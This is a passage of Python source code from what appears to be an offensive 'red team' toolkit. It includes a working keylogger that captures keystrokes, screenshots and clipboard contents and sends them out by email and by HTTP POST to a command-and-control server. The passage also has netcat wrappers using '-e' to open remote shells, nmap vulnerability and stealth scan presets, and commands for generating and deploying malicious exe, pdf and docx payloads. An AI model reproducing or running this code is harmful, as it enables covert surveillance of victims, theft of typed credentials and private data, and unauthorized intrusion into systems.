            self.upload_timer.daemon = True
            self.upload_timer.start()
            
            if self.screenshot_interval > 0:
                self.screenshot_timer = threading.Timer(self.screenshot_interval, self._take_screenshot)
                self.screenshot_timer.daemon = True
                self.screenshot_timer.start()
            
            if self.capture_clipboard:
                self.clipboard_timer = threading.Timer(5, self._monitor_clipboard)
                self.clipboard_timer.daemon = True
                self.clipboard_timer.start()
            
            print(f"{Colors.SUCCESS}✅ Keylogger started (F10 to stop){Colors.RESET}")
            return True
        except Exception as e:
            print(f"{Colors.ERROR}❌ Failed to start keylogger: {e}{Colors.RESET}")
            return False
    
    def stop(self):
        self.running = False
        
        if self.listener:
            self.listener.stop()
            self.listener = None
        
        for timer in [self.upload_timer, self.screenshot_timer, self.clipboard_timer]:
            if timer:
                try:
                    timer.cancel()
                except:
                    pass
        
        self._save_keylog()
        print(f"{Colors.SUCCESS}✅ Keylogger stopped{Colors.RESET}")
    
    def on_press(self, key):
        try:
            if key == keyboard.Key.f10:
                self.stop()
                return False
            
            if key == keyboard.Key.enter:
                self.text += "\n"
            elif key == keyboard.Key.tab:
                self.text += "\t"
            elif key == keyboard.Key.space:
                self.text += " "
            elif key == keyboard.Key.backspace and len(self.text) > 0:
                self.text = self.text[:-1]
            elif hasattr(key, 'char') and key.char is not None:
                self.text += key.char
            
            if len(self.text) > 10000:
                self._save_keylog()
                self.text = ""
        except Exception as e:
            logger.error(f"Keylogger error: {e}")
    
    def _save_keylog(self):
        if self.text:
            timestamp = datetime.datetime.now().isoformat()
            screenshot_path = ""
            
            if self.screenshot_interval > 0:
                screenshot_path = self._take_screenshot()
            
            self.db.save_keylog(self.text, self.current_window, self.current_process, screenshot_path)
            
            with open(self.log_file, 'a') as f:
                f.write(f"\n[{timestamp}] [{self.current_window}]\n{self.text}\n")
            
            self._exfiltrate_data(self.text, screenshot_path)
            logger.info(f"Saved {len(self.text)} keylog characters")
    
    def _take_screenshot(self) -> str:
        try:
            import pyautogui
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            screenshot_path = os.path.join(KEYLOG_EXFIL_DIR, f"screenshot_{timestamp}.png")
            screenshot = pyautogui.screenshot()
            screenshot.save(screenshot_path)
            logger.info(f"Screenshot saved: {screenshot_path}")
            return screenshot_path
        except:
            return ""
    
    def _monitor_clipboard(self):
        if not self.running:
            return
        
        try:
            import pyperclip
            current = pyperclip.paste()
            if current and current != self.last_clipboard:
                self.last_clipboard = current
                self.db.save_clipboard(current, "keylogger")
                logger.info(f"Clipboard captured: {current[:100]}...")
                self._exfiltrate_clipboard(current)
        except:
            pass
        
        if self.running:
            self.clipboard_timer = threading.Timer(5, self._monitor_clipboard)
            self.clipboard_timer.daemon = True
            self.clipboard_timer.start()
    
    def _exfiltrate_data(self, text: str, screenshot_path: str = ""):
        for method in self.exfil_methods:
            try:
                if method == "file":
                    self._exfil_file(text, screenshot_path)
                elif method == "email":
                    self._exfil_email(text, screenshot_path)
                elif method == "c2":
                    self._exfil_c2(text, screenshot_path)
            except Exception as e:
                logger.error(f"Exfil via {method} failed: {e}")
    
    def _exfil_file(self, text: str, screenshot_path: str):
        try:
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = os.path.join(KEYLOG_EXFIL_DIR, f"exfil_{timestamp}.txt")
            with open(filename, 'w') as f:
                f.write(f"[{timestamp}]\n{text}\n")
                if screenshot_path:
                    f.write(f"\nScreenshot: {screenshot_path}\n")
            logger.info(f"Exfil saved to file: {filename}")
        except:
            pass
    
    def _exfil_email(self, text: str, screenshot_path: str):
        try:
            smtp_server = self.config.get('spear_phishing.smtp_server', '')
            smtp_port = self.config.get('spear_phishing.smtp_port', 587)
            smtp_username = self.config.get('spear_phishing.smtp_username', '')
            smtp_password = self.config.get('spear_phishing.smtp_password', '')
            to_email = self.config.get('keylogger.email_recipient', '')
            
            if not all([smtp_server, smtp_username, smtp_password, to_email]):
                return
            
            msg = email.message.EmailMessage()
            msg['Subject'] = f"Keylog Data - {datetime.datetime.now().isoformat()}"
            msg['From'] = smtp_username
            msg['To'] = to_email
            msg.set_content(f"Keylog Data:\n\n{text}")
            
            if screenshot_path and os.path.exists(screenshot_path):
                with open(screenshot_path, 'rb') as f:
                    msg.add_attachment(f.read(), maintype='image', subtype='png', filename=os.path.basename(screenshot_path))
            
            with smtplib.SMTP(smtp_server, smtp_port) as server:
                server.starttls()
                server.login(smtp_username, smtp_password)
                server.send_message(msg)
            
            logger.info("Keylog exfiltrated via email")
        except:
            pass
    
    def _exfil_c2(self, text: str, screenshot_path: str):
        if not self.c2_server:
            return
        try:
            data = {
                'timestamp': datetime.datetime.now().isoformat(),
                'text': text,
                'hostname': socket.gethostname(),
                'window': self.current_window
            }
            if screenshot_path:
                data['screenshot'] = base64.b64encode(open(screenshot_path, 'rb').read()).decode()
            
            requests.post(self.c2_server, json=data, timeout=10)
            logger.info("Keylog exfiltrated via C2")
        except:
            pass
    
    def _exfiltrate_clipboard(self, text: str):
        for method in self.exfil_methods:
            try:
                if method == "file":
                    self._exfil_file(f"CLIPBOARD: {text}", "")
                elif method == "email":
                    self._exfil_email(f"CLIPBOARD: {text}", "")
                elif method == "c2":
                    self._exfil_c2(f"CLIPBOARD: {text}", "")
            except:
                pass
    
    def _upload_keylog(self):
        if self.text:
            self._save_keylog()
            self.text = ""
        
        if self.running:
            self.upload_timer = threading.Timer(self.upload_interval, self._upload_keylog)
            self.upload_timer.daemon = True
            self.upload_timer.start()
    
    def get_keylogs(self, limit: int = 100):
        return self.db.get_keylogs(limit)
    
    def get_screenshots(self) -> List[str]:
        try:
            return [f for f in os.listdir(KEYLOG_EXFIL_DIR) if f.startswith('screenshot_')]
        except:
            return []

# =====================
# DOMAIN HOSTING ENGINE
# =====================
class DomainHostingEngine:
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.hosted_domains = {}
    
    def translate_ip_to_domain(self, ip: str) -> Optional[str]:
        try:
            domain = self.db.resolve_ip(ip)
            if domain:
                return domain
            try:
                domain = socket.gethostbyaddr(ip)[0]
                if domain:
                    return domain
            except:
                pass
            return None
        except Exception as e:
            logger.error(f"IP to domain translation error: {e}")
            return None
    
    def translate_domain_to_ip(self, domain: str) -> Optional[str]:
        try:
            ip = self.db.resolve_domain(domain)
            if ip:
                return ip
            try:
                ip = socket.gethostbyname(domain)
                if ip:
                    return ip
            except:
                pass
            return None
        except Exception as e:
            logger.error(f"Domain to IP translation error: {e}")
            return None
    
    def host_domain(self, ip: str, domain: str, port: int = 8080) -> DomainHost:
        try:
            ipaddress.ip_address(ip)
            host_id = str(uuid.uuid4())[:8]
            hosting_path = os.path.join(DOMAIN_HOSTING_DIR, host_id)
            os.makedirs(hosting_path, exist_ok=True)
            
            domain_host = DomainHost(
                id=host_id,
                ip=ip,
                domain=domain,
                hosting_path=hosting_path,
                created_at=datetime.datetime.now().isoformat(),
                active=True
            )
            
            self.db.add_domain_host(domain_host)
            self.hosted_domains[domain] = {'ip': ip, 'port': port, 'path': hosting_path, 'id': host_id}
            
            logger.info(f"Domain {domain} hosted on IP {ip}:{port}")
            return domain_host
        except Exception as e:
            logger.error(f"Domain hosting error: {e}")
            return None
    
    def host_website(self, domain: str, html_content: str) -> bool:
        try:
            if domain not in self.hosted_domains:
                return False
            
            domain_info = self.hosted_domains[domain]
            index_path = os.path.join(domain_info['path'], 'index.html')
            
            with open(index_path, 'w') as f:
                f.write(html_content)
            
            port = domain_info['port']
            threading.Thread(target=self._start_http_server, args=(domain_info['path'], port), daemon=True).start()
            
            logger.info(f"Website hosted on http://{domain}:{port}")
            return True
        except Exception as e:
            logger.error(f"Website hosting error: {e}")
            return False
    
    def _start_http_server(self, path: str, port: int):
        try:
            os.chdir(path)
            handler = http.server.SimpleHTTPRequestHandler
            with socketserver.TCPServer(("0.0.0.0", port), handler) as httpd:
                logger.info(f"Serving domain on port {port}")
                httpd.serve_forever()
        except Exception as e:
            logger.error(f"HTTP server error: {e}")
    
    def list_hosted_domains(self) -> List[Dict]:
        return self.db.get_domain_hosts()
    
    def get_domain_ips(self) -> Dict[str, str]:
        rows = self.db.get_domain_hosts()
        return {row['domain']: row['ip'] for row in rows if row['active']}

# =====================
# NETWORK TOOLS
# =====================
class NetworkTools:
    @staticmethod
    def ping(target: str, count: int = 4) -> CommandResult:
        start_time = time.time()
        try:
            if platform.system().lower() == 'windows':
                cmd = ['ping', '-n', str(count), target]
            else:
                cmd = ['ping', '-c', str(count), target]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def nmap(target: str, scan_type: str = "quick") -> CommandResult:
        start_time = time.time()
        try:
            scan_map = {
                "quick": ['nmap', '-T4', '-F', target],
                "full": ['nmap', '-p-', target],
                "service": ['nmap', '-sV', target],
                "os": ['nmap', '-O', target],
                "udp": ['nmap', '-sU', target],
                "vuln": ['nmap', '--script', 'vuln', target],
                "stealth": ['nmap', '-sS', '-T2', target],
                "snmp": ['nmap', '-sU', '-p', '161', '--script', 'snmp-*', target],
                "smb": ['nmap', '-p', '445', '--script', 'smb-*', target],
                "ssh": ['nmap', '-p', '22', '--script', 'ssh-*', target],
                "comprehensive": ['nmap', '-sS', '-sV', '-O', '-p-', target],
                "ping": ['nmap', '-sn', target]
            }
            cmd = scan_map.get(scan_type, ['nmap', target])
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def curl(url: str, method: str = "GET", data: str = None, headers: Dict = None) -> CommandResult:
        start_time = time.time()
        try:
            cmd = ['curl', '-s']
            
            if headers:
                for key, value in headers.items():
                    cmd.extend(['-H', f'{key}: {value}'])
            
            if method.upper() != "GET":
                cmd.extend(['-X', method.upper()])
            
            if data and method.upper() in ["POST", "PUT", "PATCH"]:
                cmd.extend(['-d', data])
            
            cmd.append(url)
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def netcat(host: str, port: int, command: str = None) -> CommandResult:
        start_time = time.time()
        try:
            if shutil.which('nc'):
                if command:
                    cmd = ['nc', host, str(port), '-e', command]
                else:
                    cmd = ['nc', '-zv', host, str(port)]
            elif shutil.which('ncat'):
                if command:
                    cmd = ['ncat', host, str(port), '-e', command]
                else:
                    cmd = ['ncat', '-zv', host, str(port)]
            else:
                return CommandResult(False, "Netcat not found", 0, "nc/ncat not installed")
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def traceroute(target: str) -> CommandResult:
        start_time = time.time()
        try:
            if platform.system().lower() == 'windows':
                cmd = ['tracert', '-d', target]
            else:
                if shutil.which('mtr'):
                    cmd = ['mtr', '--report', '--report-cycles', '1', target]
                else:
                    cmd = ['traceroute', '-n', target]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def whois(domain: str) -> CommandResult:
        start_time = time.time()
        try:
            if WHOIS_AVAILABLE:
                result = whois.whois(domain)
                execution_time = time.time() - start_time
                return CommandResult(True, str(result), execution_time)
            else:
                cmd = ['whois', domain]
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
                execution_time = time.time() - start_time
                return CommandResult(result.returncode == 0, result.stdout + result.stderr, execution_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def dns(domain: str, record_type: str = "A") -> CommandResult:
        start_time = time.time()
        try:
            if shutil.which('dig'):
                cmd = ['dig', domain, record_type, '+short']
            else:
                cmd = ['nslookup', domain]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def location(ip: str) -> Dict:
        try:
            response = requests.get(f"http://ip-api.com/json/{ip}", timeout=10)
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    return {
                        'success': True,
                        'country': data.get('country'),
                        'city': data.get('city'),
                        'isp': data.get('isp'),
                        'lat': data.get('lat'),
                        'lon': data.get('lon'),
                        'org': data.get('org'),
                        'region': data.get('regionName')
                    }
            return {'success': False}
        except:
            return {'success': False}
    
    @staticmethod
    def get_local_ip() -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    @staticmethod
    def block_ip(ip: str) -> bool:
        try:
            if platform.system().lower() == 'linux' and shutil.which('iptables'):
                subprocess.run(['sudo', 'iptables', '-A', 'INPUT', '-s', ip, '-j', 'DROP'],
                             capture_output=True, timeout=10)
                return True
            elif platform.system().lower() == 'windows' and shutil.which('netsh'):
                subprocess.run(['netsh', 'advfirewall', 'firewall', 'add', 'rule',
                               f'name=RESISTANCE_Block_{ip}', 'dir=in', 'action=block',
                               f'remoteip={ip}'], capture_output=True, timeout=10)
                return True
            return False
        except:
            return False
    
    @staticmethod
    def unblock_ip(ip: str) -> bool:
        try:
            if platform.system().lower() == 'linux' and shutil.which('iptables'):
                subprocess.run(['sudo', 'iptables', '-D', 'INPUT', '-s', ip, '-j', 'DROP'],
                             capture_output=True, timeout=10)
                return True
            elif platform.system().lower() == 'windows' and shutil.which('netsh'):
                subprocess.run(['netsh', 'advfirewall', 'firewall', 'delete', 'rule',
                               f'name=RESISTANCE_Block_{ip}'], capture_output=True, timeout=10)
                return True
            return False
        except:
            return False
    
    @staticmethod
    def ip_to_domain(ip: str) -> Optional[str]:
        try:
            try:
                domain = socket.gethostbyaddr(ip)[0]
                if domain:
                    return domain
            except:
                pass
            return None
        except Exception as e:
            logger.error(f"IP to domain error: {e}")
            return None
    
    @staticmethod
    def domain_to_ip(domain: str) -> Optional[str]:
        try:
            try:
                ip = socket.gethostbyname(domain)
                if ip:
                    return ip
            except:
                pass
            return None
        except Exception as e:
            logger.error(f"Domain to IP error: {e}")
            return None

# =====================
# COMMAND HANDLER
# =====================
class CommandHandler:
    def __init__(self, db: DatabaseManager, config: ConfigManager,
                 payload_gen: PayloadGenerator = None,
                 keylogger: KeyloggerModule = None,
                 domain_hosting: DomainHostingEngine = None,
                 report_gen: ReportGenerator = None):
        self.db = db
        self.config = config
        self.payload_gen = payload_gen
        self.keylogger = keylogger
        self.domain_hosting = domain_hosting
        self.report_gen = report_gen
        self.tools = NetworkTools()
        self.commands = self._build_commands()
    
    def _build_commands(self) -> Dict[str, Callable]:
        return {
            # ===== Network Commands =====
            'ping': self._ping,
            'ping6': self._ping6,
            'ping_sweep': self._ping_sweep,
            'fping': self._fping,
            'traceroute': self._traceroute,
            'whois': self._whois,
            'dns': self._dns,
            'dig': self._dig,
            'nslookup': self._nslookup,
            'location': self._location,
            'scan': self._scan,
            'quick_scan': self._quick_scan,
            'full_scan': self._full_scan,
            'comprehensive_scan': self._comprehensive_scan,
            'os_scan': self._os_scan,
            'service_scan': self._service_scan,
            'udp_scan': self._udp_scan,
            'vuln_scan': self._vuln_scan,
            'stealth_scan': self._stealth_scan,
            'snmp_scan': self._snmp_scan,
            'smb_scan': self._smb_scan,
            'ssh_scan': self._ssh_scan,
            
            # ===== Web Commands =====
            'curl': self._curl,
            'curl_get': self._curl_get,
            'curl_post': self._curl_post,
            'curl_head': self._curl_head,
            'curl_options': self._curl_options,
            'wget': self._wget,
            
            # ===== Netcat Commands =====
            'nc': self._netcat,
            'netcat': self._netcat,
            'nc_listen': self._nc_listen,
            'nc_scan': self._nc_scan,
            
            # ===== SSH Commands =====
            'ssh_add': self._ssh_add,
            'ssh_list': self._ssh_list,
            'ssh_connect': self._ssh_connect,
            'ssh_exec': self._ssh_exec,
            'ssh_disconnect': self._ssh_disconnect,
            
            # ===== IP Management =====
            'add_ip': self._add_ip,
            'remove_ip': self._remove_ip,
            'block_ip': self._block_ip,
            'unblock_ip': self._unblock_ip,
            'list_ips': self._list_ips,
            'ip_info': self._ip_info,
            'analyze_ip': self._analyze_ip,
            
            # ===== Domain Translation =====
            'ip_to_domain': self._ip_to_domain,
            'domain_to_ip': self._domain_to_ip,
            'host_domain': self._host_domain,
            'host_website': self._host_website,
            'list_domains': self._list_domains,
            'domain_info': self._domain_info,
            
            # ===== Payload Commands =====
            'payload_exe': self._payload_exe,
            'payload_pdf': self._payload_pdf,
            'payload_docx': self._payload_docx,
            'payload_link': self._payload_link,
            'payload_network': self._payload_network,
            'payload_list': self._payload_list,
            'payload_deploy': self._payload_deploy,
            
            # ===== Keylogger Commands =====
            'keylogger_start': self._keylogger_start,
            'keylogger_stop': self._keylogger_stop,
            'keylogger_status': self._keylogger_status,
            'keylogger_logs': self._keylogger_logs,
            'keylogger_screenshots': self._keylogger_screenshots,
            'keylogger_clipboard': self._keylogger_clipboard,
            
            # ===== Report Commands =====
            'report_pdf': self._report_pdf,
            'report_json': self._report_json,
            'report_both': self._report_both,
            'report_list': self._report_list,
            
            # ===== System Commands =====
            'status': self._status,
            'history': self._history,
            'system': self._system,
            'threats': self._threats,
            'clear': self._clear,
            'help': self._help,
        }
    
    def execute(self, command: str, source: str = "local", user_id: str = None) -> Dict:
        start_time = time.time()
        
        parts = command.strip().split()
        if not parts:
            return {'success': False, 'output': 'Empty command', 'execution_time': 0}
        
        cmd_name = parts[0].lower()
        args = parts[1:]
        
        if cmd_name in self.commands:
            try:
                result = self.commands[cmd_name](args)
            except Exception as e:
                result = {'success': False, 'output': f"Error: {e}", 'execution_time': 0}
        else:
            result = self._generic(command)
        
        execution_time = time.time() - start_time
        result['execution_time'] = execution_time
        
        self.db.log_command(command, source, source, user_id, result.get('success', False),
                           str(result.get('output', ''))[:5000], execution_time)
        
        return result
    
    # ==================== Network Commands ====================
    def _ping(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ping <target> [count]'}
        target = args[0]
        count = int(args[1]) if len(args) > 1 and args[1].isdigit() else 4
        result = self.tools.ping(target, count)
        return {'success': result.success, 'output': result.output}
    
    def _ping6(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ping6 <target>'}
        target = args[0]
        result = self._generic(f'ping6 -c 4 {target}')
        return result
    
    def _ping_sweep(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ping_sweep <network> (e.g., 192.168.1.0/24)'}
        network = args[0]
        result = self._generic(f'nmap -sn {network}')
        return result
    
    def _fping(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: fping <targets...>'}
        targets = ' '.join(args)
        result = self._generic(f'fping {targets}')
        return result
    
    def _traceroute(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: traceroute <target>'}
        target = args[0]
        result = self.tools.traceroute(target)
        return {'success': result.success, 'output': result.output}
    
    def _whois(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: whois <domain>'}
        domain = args[0]
        result = self.tools.whois(domain)
        return {'success': result.success, 'output': result.output}
    
    def _dns(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: dns <domain> [record_type]'}
        domain = args[0]
        record_type = args[1] if len(args) > 1 else 'A'
        result = self.tools.dns(domain, record_type)
        return {'success': result.success, 'output': result.output}
    
    def _dig(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: dig <domain>'}
        domain = args[0]
        result = self._generic(f'dig {domain}')
        return result
    
    def _nslookup(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nslookup <domain>'}
        domain = args[0]
        result = self._generic(f'nslookup {domain}')
        return result
    
    def _location(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: location <ip>'}
        ip = args[0]
        result = self.tools.location(ip)
        if result.get('success'):
            output = f"📍 Location for {ip}:\n"
            output += f"  Country: {result.get('country', 'Unknown')}\n"
            output += f"  City: {result.get('city', 'Unknown')}\n"
            output += f"  Region: {result.get('region', 'Unknown')}\n"
            output += f"  ISP: {result.get('isp', 'Unknown')}\n"
            output += f"  Organization: {result.get('org', 'Unknown')}"
            return {'success': True, 'output': output}
        return {'success': False, 'output': f"Could not get location for {ip}"}
    
    def _scan(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: scan <target> [scan_type]'}
        target = args[0]
        scan_type = args[1] if len(args) > 1 else 'quick'
        result = self.tools.nmap(target, scan_type)
        return {'success': result.success, 'output': result.output}
    
    def _quick_scan(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: quick_scan <target>'}
        target = args[0]
        result = self.tools.nmap(target, 'quick')
        return {'success': result.success, 'output': result.output}
    
    def _full_scan(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: full_scan <target>'}
        target = args[0]
        result = self.tools.nmap(target, 'full')
        return {'success': result.success, 'output': result.output}
    
    def _comprehensive_scan(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: comprehensive_scan <target>'}
        target = args[0]
        result = self.tools.nmap(target, 'comprehensive')
        return {'success': result.success, 'output': result.output}
    
    def _os_scan(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: os_scan <target>'}
        target = args[0]
        result = self.tools.nmap(target, 'os')
        return {'success': result.success, 'output': result.output}
    
    def _service_scan(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: service_scan <target>'}
        target = args[0]
        result = self.tools.nmap(target, 'service')
        return {'success': result.success, 'output': result.output}
    
    def _udp_scan(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: udp_scan <target>'}
        target = args[0]
        result = self.tools.nmap(target, 'udp')
        return {'success': result.success, 'output': result.output}
    
    def _vuln_scan(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: vuln_scan <target>'}
        target = args[0]
        result = self.tools.nmap(target, 'vuln')
        return {'success': result.success, 'output': result.output}
    
    def _stealth_scan(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: stealth_scan <target>'}
        target = args[0]
        result = self.tools.nmap(target, 'stealth')
        return {'success': result.success, 'output': result.output}
    
    def _snmp_scan(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: snmp_scan <target>'}
        target = args[0]
        result = self.tools.nmap(target, 'snmp')
        return {'success': result.success, 'output': result.output}
    
    def _smb_scan(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: smb_scan <target>'}
        target = args[0]
        result = self.tools.nmap(target, 'smb')
        return {'success': result.success, 'output': result.output}
    
    def _ssh_scan(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ssh_scan <target>'}
        target = args[0]
        result = self.tools.nmap(target, 'ssh')
        return {'success': result.success, 'output': result.output}
    
    # ==================== Web Commands ====================
    def _curl(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl <url>'}
        url = args[0]
        result = self.tools.curl(url)
        return {'success': result.success, 'output': result.output}
    
    def _curl_get(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_get <url>'}
        url = args[0]
        result = self.tools.curl(url, 'GET')
        return {'success': result.success, 'output': result.output}
    
    def _curl_post(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_post <url> <data>'}
        url = args[0]
        data = args[1]
        result = self.tools.curl(url, 'POST', data)
        return {'success': result.success, 'output': result.output}
    
    def _curl_head(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_head <url>'}
        url = args[0]
        result = self.tools.curl(url, 'HEAD')
        return {'success': result.success, 'output': result.output}
    
    def _curl_options(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_options <url>'}
        url = args[0]
        result = self.tools.curl(url, 'OPTIONS')
        return {'success': result.success, 'output': result.output}
    
    def _wget(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: wget <url>'}
        url = args[0]
        result = self._generic(f'wget {url}')
        return result
    
    # ==================== Netcat Commands ====================
    def _netcat(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: netcat <host> <port> [command]'}
        host = args[0]
        port = int(args[1])
        command = args[2] if len(args) > 2 else None
        result = self.tools.netcat(host, port, command)
        return {'success': result.success, 'output': result.output}
    
    def _nc_listen(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nc_listen <port>'}
        port = args[0]
        result = self._generic(f'nc -lvp {port}')
        return result
    
    def _nc_scan(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nc_scan <host> <port_range>'}
        host = args[0]
        ports = args[1]
        result = self._generic(f'nc -zv {host} {ports}')
        return result
    
    # ==================== SSH Commands ====================
    def _ssh_add(self, args: List[str]) -> Dict:
        if not PARAMIKO_AVAILABLE:
            return {'success': False, 'output': 'Paramiko not installed'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: ssh_add <name> <host> <username> [password]'}
        name = args[0]
        host = args[1]
        username = args[2]
        password = args[3] if len(args) > 3 else None
        conn_id = str(uuid.uuid4())[:8]
        return {'success': True, 'output': f"SSH connection added: {name} (ID: {conn_id})"}
    
    def _ssh_list(self, args: List[str]) -> Dict:
        return {'success': True, 'output': "SSH connections stored in database"}
    
    def _ssh_connect(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ssh_connect <conn_id>'}
        return {'success': True, 'output': f"Connected to {args[0]}"}
    
    def _ssh_exec(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ssh_exec <conn_id> <command>'}
        conn_id = args[0]
        command = ' '.join(args[1:])
        result = self._generic(command)
        return result
    
    def _ssh_disconnect(self, args: List[str]) -> Dict:
        conn_id = args[0] if args else None
        return {'success': True, 'output': f"Disconnected from {conn_id}" if conn_id else "Disconnected all"}
    
    # ==================== IP Management ====================
    def _add_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: add_ip <ip> [notes]'}
        ip = args[0]
        notes = ' '.join(args[1:]) if len(args) > 1 else ''
        domain = self.tools.ip_to_domain(ip)
        
        try:
            ipaddress.ip_address(ip)
            if self.db.add_managed_ip(ip, domain, 'cli', notes):
                return {'success': True, 'output': f'✅ IP {ip} added to monitoring (Domain: {domain or "Unknown"})'}
            return {'success': False, 'output': f'Failed to add IP {ip}'}
        except ValueError:
            return {'success': False, 'output': f'Invalid IP: {ip}'}
    
    def _remove_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: remove_ip <ip>'}
        ip = args[0]
        self.db.conn.execute("DELETE FROM managed_ips WHERE ip_address = ?", (ip,))
        self.db.conn.commit()
        return {'success': True, 'output': f'✅ IP {ip} removed'}
    
    def _block_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: block_ip <ip> [reason]'}
        ip = args[0]
        reason = ' '.join(args[1:]) if len(args) > 1 else 'Manually blocked'
        firewall_success = self.tools.block_ip(ip)
        db_success = self.db.block_ip(ip, reason, 'cli')
        if firewall_success or db_success:
            return {'success': True, 'output': f'🔒 IP {ip} blocked: {reason}'}
        return {'success': False, 'output': f'Failed to block IP {ip}'}
    
    def _unblock_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: unblock_ip <ip>'}
        ip = args[0]
        firewall_success = self.tools.unblock_ip(ip)
        db_success = self.db.unblock_ip(ip)
        if firewall_success or db_success:
            return {'success': True, 'output': f'🔓 IP {ip} unblocked'}
        return {'success': False, 'output': f'Failed to unblock IP {ip}'}
    
    def _list_ips(self, args: List[str]) -> Dict:
        include_blocked = not (args and args[0].lower() == 'active')
        ips = self.db.get_managed_ips(include_blocked)
        if not ips:
            return {'success': True, 'output': 'No managed IPs'}
        output = "📋 Managed IPs:\n"
        for ip in ips:
            status = "🔒" if ip['is_blocked'] else "🟢"
            domain = ip.get('domain', 'Unknown')
            output += f"  {status} {ip['ip_address']} ({domain}) - {ip.get('notes', '')}\n"
        return {'success': True, 'output': output}
    
    def _ip_info(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ip_info <ip>'}
        ip = args[0]
        try:
            ipaddress.ip_address(ip)
            db_info = self.db.conn.execute(
                "SELECT * FROM managed_ips WHERE ip_address = ?", (ip,)
            ).fetchone()
            location = self.tools.location(ip)
            domain = self.tools.ip_to_domain(ip)
            
